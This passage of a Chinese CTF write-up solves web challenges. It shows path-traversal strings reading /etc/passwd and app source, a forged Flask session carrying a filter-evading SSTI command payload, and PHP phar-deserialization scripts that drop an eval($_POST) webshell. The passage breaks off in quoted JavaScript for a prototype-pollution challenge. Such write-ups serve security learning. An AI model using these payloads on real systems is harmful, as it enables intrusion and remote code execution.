class="code"><pre><span class="line">..././..././..././etc/passwd</span><br><span class="line">..././..././..././app/app.py</span><br><span class="line">..././..././..././etc/config.py</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa9b05166.png" alt="image-20240218160623172"></p><p>&#x2F;download?file&#x3D;&#x2F;app&#x2F;app.py</p><p>拿到源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>明显重点在backdoor函数上</p><p>download?file&#x3D;&#x2F;app&#x2F;config.py</p><p>拿到secret_key</p><p>secret_key &#x3D; “y0u_n3ver_k0nw_s3cret_key_1s_newst4r”</p><p>这里又需要让session的值可控，session伪造无疑了</p><p>然后禁用了一大堆ssti函数，肯定是要打ssti了</p><p>所以</p><p>用 flask_session_cookie_manager3.py</p><p>#解密：python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”</p><p>#加密：python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;user&#x27;:&#x27;&#123;%print(((g[\&#x27;pop\&#x27;][\&#x27;_\&#x27;*2~\&#x27;g\&#x27;\&#x27;lobals\&#x27;~\&#x27;_\&#x27;*2][\&#x27;_\&#x27;*2~\&#x27;b\&#x27;\&#x27;uiltins\&#x27;~\&#x27;_\&#x27;*2][\&#x27;_\&#x27;*2~\&#x27;import\&#x27;~\&#x27;_\&#x27;*2](\&#x27;OS\&#x27;|lower)[\&#x27;p\&#x27;\&#x27;open\&#x27;](\&#x27;CAT /y*\&#x27;|lower))[\&#x27;read\&#x27;]()))%&#125;&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa9544a11.png" alt="image-20240218184409297"></p><p>吐了</p><p>伪造后的session：.eJy1kD0OwjAMhe9iqVK7uYltJM6ShYGBBaFSpEqld6d26v7QDiwsVhK_9_k5Pbye1wbO0BeP5nZvy67r3pe2bcoEKdXx5IVrLeInoVUXqkMLmU-FbNegpfY3iT8SiH3eMtnemDeEnVnnCc_ZaYOxVf6UIatlte4-XQ5hQvQfkvD9swl57KKtkiVxuqICMG-xAHDOJRsvRQ-jeCRtsOHDAS84xRxEjholUFXFAMMHKM2ZMA.ZVd5wg.NN4PVUmSQiA6Ll-XV1SkJq_5b50<br><img src="https://bu.dusays.com/2024/05/13/66423286e2626.png" alt="image-20240218190941456"></p><h3 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h3><p><img src="https://bu.dusays.com/2024/05/13/6641fa9898daa.png" alt="image-20240218191233468"></p><p>初始界面有个文件上传功能</p><p><img src="https://bu.dusays.com/2024/05/14/664379d338e70.png" alt="image-20240218191503324"></p><p>提示class.php</p><p>访问</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa946784e.png" alt="image-20240218191802832"></p><p>一眼phar反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=system(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目对__HALT_COMPILER()进行了过滤，可以使用gzip等压缩进行绕过</p><p>直接</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;gzip 1.phar&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="string">&quot;1.phar.gz&quot;</span>,<span class="string">&quot;1.jpg&quot;</span>);</span><br></pre></td></tr></table></figure><p>上传1.jpg文件</p><p>在class.php触发phar反序列化</p><p>rce拿到flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa94c36b1.png" alt="image-20240218195221434"></p><p>整个题理解还是差不多 但是对phar反序列化还是存在一些问题</p><h3 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h3><p>也是javascript原型链污染</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9b8fd72.png" alt="image-20240218200553004"></p><p>是week3中Otenkgirl的升级版</p><p>依旧是两个主要的文件，info.js,submit.js，但这次的geiinfo（）函数没有那么简单能够利用了，config文件和default_config 文件中都有min_public_time。</p><p>info.js中仍有:</p><p><img src="https://bu.dusays.com/2024/05/14/664379d3e01d8.png" alt="image-20240218202954663"></p><p>明显minTimestamp与函数createDate有关</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">createDate</span> = (<span class="params">str, opts</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">CopiedDefaultOptions</span> = <span class="title function_">copyJSON</span>(<span class="variable constant_">DEFAULT_CREATE_DATE_OPTIONS</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts === <span class="string">&quot;undefined&quot;</span>) opts = <span class="title class_">CopiedDefaultOptions</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts !== <span class="string">&quot;object&quot;</span>) opts = &#123; ...<span class="title class_">CopiedDefaultOptions</span>, <span class="attr">UTC</span>: <span class="title class_">Boolean</span>(opts) &#125;;</span><br><span class="line">    opts.<span class="property">UTC</span> = <span class="keyword">typeof</span> opts.<span class="property">UTC</span> === <span class="string">&quot;undefined&quot;</span> ? <span class="title class_">CopiedDefaultOptions</span>.<span class="property">UTC</span> : <span class="title class_">Boolean</span>(opts.<span class="property">UTC</span>);</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span> || <span class="title class_">CopiedDefaultOptions</span>.<span class="property">format</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(opts.<span class="property">format</span>)) opts.<span class="property">format</span> = [opts.<span class="property">format</span>]</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> <span class="keyword">typeof</span> f === <span class="string">&quot;string&quot;</span>)</span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/yy|yyyy|MM|dd|HH|mm|ss|fff/</span>.<span class="title function_">test</span>(f) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`At least one format specifier is required.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">`|<span class="subst">$&#123;f&#125;</span>|`</span>.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;yy&quot;</span>).<span class="title function_">split</span>(<span class="regexp">/yy|MM|dd|HH|mm|ss|fff/</span>).<span class="title function_">includes</span>(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`Delimeters are required between format specifiers.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f.<span class="title function_">includes</span>(<span class="string">&quot;yyyy&quot;</span>) &amp;&amp; f.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">includes</span>(<span class="string">&quot;yy&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`&quot;yyyy&quot; and &quot;yy&quot; cannot be used together.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    opts.<span class="property">baseDate</span> = <span class="keyword">new</span> <span class="title class_">Date</span>(opts.<span class="property">baseDate</span> || <span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(str);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// number string</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/^\-?\d+$/</span>.<span class="title function_">test</span>(str.<span class="title function_">trim</span>())) <span class="keyword">return</span> <span class="title function_">createDate</span>(<span class="title class_">Number</span>(str.<span class="title function_">trim</span>()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// utility functions</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">isLeapYear</span> = year =&gt; (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) || (year % <span class="number">400</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">MonthDay</span> = (<span class="params">mon, year</span>) =&gt; [<span class="number">31</span>, <span class="title function_">isLeapYear</span>(year) ? <span class="number">29</span> : <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>][mon - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">pad</span> = (<span class="params">n, len</span>) =&gt; <span class="title class_">String</span>(n).<span class="title function_">padStart</span>(len, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">getYMD</span> = (<span class="params">date</span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> regres = <span class="regexp">/^(\d+) *(\-|\/) *(\d+) *(\-|\/) *(\d+)$/</span>.<span class="title function_">exec</span>(date.<span class="title function_">trim</span>())</span><br><span class="line">            <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">            <span class="keyword">const</span> [n1, n2, n3] = [regres[<span class="number">1</span>], regres[<span class="number">3</span>], regres[<span class="number">5</span>]].<span class="title function_">map</span>(<span class="title class_">Number</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="number">12</span> &amp;&amp; <span class="number">1</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="title class_">MonthDay</span>(n2, n1)) &#123;</span><br><span class="line">                <span class="comment">// 2020-12-31</span></span><br><span class="line">                <span class="keyword">let</span> yyyy = <span class="title function_">pad</span>(n1, <span class="number">1</span>), <span class="variable constant_">MM</span> = <span class="title function_">pad</span>(n2, <span class="number">2</span>), dd = <span class="title function_">pad</span>(n3, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="number">12</span> &amp;&amp; <span class="number">1</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="title class_">MonthDay</span>(n1, n3)) &#123;</span><br><span class="line">                <span class="comment">// 12-31-2020</span></span><br><span class="line">                <span class="keyword">let</span> yyyy = <span class="title function_">pad</span>(n3, <span class="number">1</span>), <span class="variable constant_">MM</span> = <span class="title function_">pad</span>(n1, <span class="number">2</span>), dd = <span class="title function_">pad</span>(n2, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">getHMS</span> = (<span class="params">time</span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> regres = <span class="regexp">/^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/</span>.<span class="title function_">exec</span>(time.<span class="title function_">trim</span>())</span><br><span class="line">            <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">            <span class="keyword">let</span> [n1, n2, n3, n4] = [regres[<span class="number">1</span>], regres[<span class="number">2</span>], regres[<span class="number">4</span>], regres[<span class="number">6</span>]].<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="keyword">typeof</span> t === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title class_">Number</span>(t));</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> n3 === <span class="string">&quot;undefined&quot;</span>) n3 = <span class="number">0</span>; <span class="comment">// 23:59(:59)?</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="number">23</span> &amp;&amp; <span class="number">0</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="number">59</span> &amp;&amp; <span class="number">0</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="number">59</span>) &#123;</span><br><span class="line">                <span class="comment">// 23:59:59(.999)?</span></span><br><span class="line">                <span class="keyword">let</span> <span class="variable constant_">HH</span> = <span class="title function_">pad</span>(n1, <span class="number">2</span>), mm = <span class="title function_">pad</span>(n2, <span class="number">2</span>), ss = <span class="title function_">pad</span>(n3, <span class="number">2</span>),</span><br><span class="line">                    fff = <span class="keyword">typeof</span> n4 === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title function_">pad</span>(n4, <span class="number">3</span>).<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">const</span> o = &#123; <span class="variable constant_">HH</span>, mm, ss &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">typeof</span> fff !== <span class="string">&quot;undefined&quot;</span>) o.<span class="property">fff</span> = fff;</span><br><span class="line">                <span class="keyword">return</span> o;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">escapeRegExp</span> = (<span class="params">str</span>) =&gt; str.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^$&#123;&#125;()|\[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>); <span class="comment">// $&amp; means the whole matched string</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// format</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(opts.<span class="property">format</span>) &amp;&amp; opts.<span class="property">format</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> fmt <span class="keyword">of</span> opts.<span class="property">format</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> regExpr_specifier = escapeRegExp(fmt)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/yyyy/</span>, <span class="string">&quot;(y&#123;4&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/yy/</span>, <span class="string">&quot;(yy)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/MM/</span>, <span class="string">&quot;(MM)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/dd/</span>, <span class="string">&quot;(dd)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/HH/</span>, <span class="string">&quot;(HH)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/mm/</span>, <span class="string">&quot;(mm)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ss/</span>, <span class="string">&quot;(ss)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/fff/</span>, <span class="string">&quot;(fff)&quot;</span>)</span><br><span class="line">                <span class="keyword">let</span> sortTable = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">`^<span class="subst">$&#123;regExpr_specifier&#125;</span>$`</span>).<span class="title function_">exec</span>(fmt).<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">const</span> regExpr = escapeRegExp(fmt)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/yyyy/</span>, <span class="string">&quot;(-?\\d+)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/yy/</span>, <span class="string">&quot;(-?\\d+)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/MM/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/dd/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/HH/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/mm/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ss/</span>, <span class="string">&quot;(\\d&#123;1,2&#125;)&quot;</span>)</span><br><span class="line">                    .<span class="title function_">replace</span>(<span class="regexp">/fff/</span>, <span class="string">&quot;(\\d&#123;1,3&#125;)&quot;</span>)</span><br><span class="line">                <span class="keyword">let</span> regres = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">`^<span class="subst">$&#123;regExpr&#125;</span>$`</span>).<span class="title function_">exec</span>(str.<span class="title function_">trim</span>())</span><br><span class="line">                <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">const</span> dateObj = opts.<span class="property">baseDate</span></span><br><span class="line">                <span class="keyword">const</span> _UTC = opts.<span class="property">UTC</span> ? <span class="string">&quot;UTC&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">let</span> argTable = &#123;</span><br><span class="line">                    <span class="string">&quot;yyyy&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>FullYear`</span>](),</span><br><span class="line">                    <span class="string">&quot;MM&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Month`</span>]() + <span class="number">1</span>,</span><br><span class="line">                    <span class="string">&quot;dd&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Date`</span>](),</span><br><span class="line">                    <span class="string">&quot;HH&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Hours`</span>](),</span><br><span class="line">                    <span class="string">&quot;mm&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Minutes`</span>](),</span><br><span class="line">                    <span class="string">&quot;ss&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Seconds`</span>](),</span><br><span class="line">                    <span class="string">&quot;fff&quot;</span>: dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Milliseconds`</span>] ? dateObj[<span class="string">`get<span class="subst">$&#123;_UTC&#125;</span>Milliseconds`</span>]() : <span class="literal">undefined</span> <span class="comment">// due to system architecture</span></span><br><span class="line">                &#125;</span><br><span class="line">                sortTable.<span class="title function_">forEach</span>(<span class="function">(<span class="params">f, i</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (f == <span class="string">&quot;yy&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">let</span> year = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                        year = year &lt; <span class="number">100</span> ? (<span class="number">1900</span> + year) : year;</span><br><span class="line">                        <span class="keyword">return</span> argTable[<span class="string">&quot;yyyy&quot;</span>] = year;</span><br><span class="line">                    &#125;</span><br><span class="line">                    argTable[f] = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                &#125;)</span><br><span class="line">                <span class="keyword">let</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd, <span class="variable constant_">HH</span>, mm, ss, fff &#125; = argTable;</span><br><span class="line"></span><br><span class="line">                [yyyy, <span class="variable constant_">MM</span>, dd, <span class="variable constant_">HH</span>, mm, ss, fff] = [<span class="title function_">pad</span>(yyyy, <span class="number">1</span>), <span class="title function_">pad</span>(<span class="variable constant_">MM</span>, <span class="number">2</span>), <span class="title function_">pad</span>(dd, <span class="number">2</span>), <span class="title function_">pad</span>(<span class="variable constant_">HH</span>, <span class="number">2</span>), <span class="title function_">pad</span>(mm, <span class="number">2</span>), <span class="title function_">pad</span>(ss, <span class="number">2</span>), <span 